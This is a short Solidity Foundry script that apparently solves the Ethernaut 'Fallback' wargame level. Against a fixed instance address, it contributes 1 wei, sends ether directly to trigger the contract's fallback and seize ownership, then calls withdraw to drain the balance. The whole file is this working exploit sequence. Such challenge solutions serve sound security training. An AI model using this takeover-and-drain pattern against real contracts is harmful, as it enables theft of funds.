pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Script {
    // instance id: 0x1D3DF7c76c2cfb27E8BCcB1ae55cc549E9a9ADf6
    Fallback public fb = Fallback(payable(0x1D3DF7c76c2cfb27E8BCcB1ae55cc549E9a9ADf6));

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        fb.contribute{value: 1 wei}();
        payable(0x1D3DF7c76c2cfb27E8BCcB1ae55cc549E9a9ADf6).call{value: 1 wei}("");
        fb.withdraw();
        vm.stopBroadcast();
    }
}